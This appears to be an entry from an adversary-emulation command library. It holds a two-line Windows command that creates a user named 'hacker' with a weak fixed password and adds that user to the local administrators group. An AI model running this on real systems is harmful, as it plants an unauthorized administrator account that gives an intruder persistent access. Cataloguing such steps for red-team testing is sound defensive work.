---
id: 28a9cbe6-6bfa-410b-abcd-3ef032edb0cd
name: Create new user and add to administrators group
type: command
executor: bash
data: 'net user hacker Password123! /add

  net localgroup administrators /add hacker'
output: null
created_at: '2023-04-06T03:56:08.387910+00:00'
updated_at: '2023-04-10T20:36:00.785400+00:00'
---

# Create new user and add to administrators group

```bash
net user hacker Password123! /add
net localgroup administrators /add hacker
```
